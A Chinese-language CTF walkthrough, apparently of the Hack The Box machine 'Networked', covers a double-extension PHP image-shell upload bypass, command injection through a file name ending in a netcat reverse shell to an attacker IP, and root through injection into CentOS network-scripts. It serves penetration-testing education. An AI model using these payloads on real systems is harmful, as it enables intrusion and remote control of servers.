Phase 1

立足点：双扩展名图片马绕过

upload.php 过滤逻辑分析 1. MIME 类型必须是 image/gif、image/jpeg 或 image/png
2. 扩展名不能是 .php、.pht、.phtml（但没检查双扩展名！）
3. 文件头必须匹配图片格式（magic bytes）
绕过：文件名 shell.php.gif + GIF 文件头 + PHP 代码。Apache 的 mod_mime 从右向左解析扩展名，遇到不认识的 .gif 继续找，找到 .php 就当 PHP 执行。
🧒 儿童版 — 穿着 GIF 外套的 PHP服务器检查文件是不是图片：文件名以 .gif 结尾 ✓，文件头是 GIF 的 ✓，通过！但 Apache 解析时发现中间有个 .php——于是把它当 PHP 执行。就像穿着快递员制服的间谍，门卫看了看制服就放行了。
# 制作图片马
$ echo 'GIF89a' > shell.php.gif

# 上传（Burp 中确认 Content-Type: image/gif）

# 访问 /photos.php 查看上传后的文件名
$ curl 'http://10.129.52.197/uploads/10_10_15_65.php.gif?cmd=id'

Phase 2

横向移动：cron 脚本 → 文件名注入 → guly

$ cat /home/guly/crontab.guly

# check_attack.php 关键代码：
exec("nohup /bin/rm -f $path$value > /dev/null ...")

🧒 儿童版 — 用文件名当命令cron 每 3 分钟扫描 uploads 目录，删除可疑文件。但删除命令直接用文件名拼接——在 uploads 里创建一个名字带分号的"文件"，就能注入命令。
$ touch '/var/www/html/uploads/; nc 10.10.15.65 6666 -c bash'

# 等待 3 分钟 cron 触发

Phase 3

权限提升：sudo network-scripts 命令注入

guly@networked:~$ sudo -l
(root) NOPASSWD: /usr/local/sbin/changename.sh
# changename.sh 核心逻辑：
read -p "interface NAME:" NAME
...
# 写入 /etc/sysconfig/network-scripts/ifcfg-guly
🧒 儿童版 — 网卡配置填命令脚本让你输入网卡配置。CentOS 的 network-scripts 在解析 ifcfg-* 文件时，会用空格拆分每行——如果你在 NAME 字段输入 a bash，系统会尝试执行 bash。空格后面的部分被当成命令执行了。
guly@networked:~$ sudo /usr/local/sbin/changename.sh
interface NAME: a bash
interface PROXY_METHOD: a
interface BROWSER_ONLY: a
interface BOOTPROTO: a

知识点总结

双扩展名绕过：.php.gif。

Apache mod_mime 从右向左解析，不认识 .gif 就继续找到 .php。配合 GIF89a 文件头绕过 magic bytes 检查。

文件名注入。

当脚本把目录列表中的文件名拼进 exec()/system()，文件名里的 ; | $() 就是命令注入。用 touch 创建带特殊字符的文件名。

CentOS network-scripts 空格注入。

/etc/sysconfig/network-scripts/ifcfg-* 中的值如果包含空格，空格后的内容会被当作命令执行。这是 CentOS/RHEL 特有的提权路径。
